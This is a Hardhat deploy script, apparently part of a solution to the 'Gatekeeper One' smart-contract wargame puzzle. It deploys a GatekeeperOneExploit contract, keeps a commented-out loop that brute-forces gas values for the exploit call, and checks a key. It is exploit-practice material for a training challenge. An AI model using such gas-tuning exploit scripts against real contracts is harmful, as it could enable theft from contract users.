import { ethers } from "hardhat";
import { GatekeeperOneExploit } from "../typechain-types";

const main = async () => {
  const ExploitFactory = await ethers.getContractFactory("GatekeeperOneExploit");
  const exploit: GatekeeperOneExploit = await ExploitFactory.deploy();

  await exploit.waitForDeployment();

  console.log(`Exploit Deployed on Address: ${await exploit.getAddress()}`);

  // console.log("Trying Combinations To Match The Exact Gas...");
  // for (let i = 2000; i <= 9000; i++) {
  //   console.log("Trying: ", i);
  //   try {
  //     const isValid = await exploit.execute(500000 + 8098);
  //     await isValid.wait();
  //   } catch (error: any) {
  //     if (error.message.includes("without a reason string")) {
  //     } else {
  //       console.log("FOUND!: ", i);
  //       break;
  //     }
  //   }
  // }

  // const isValid = await exploit.execute();
  // await isValid.wait();

  await exploit.isKeyValid();
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
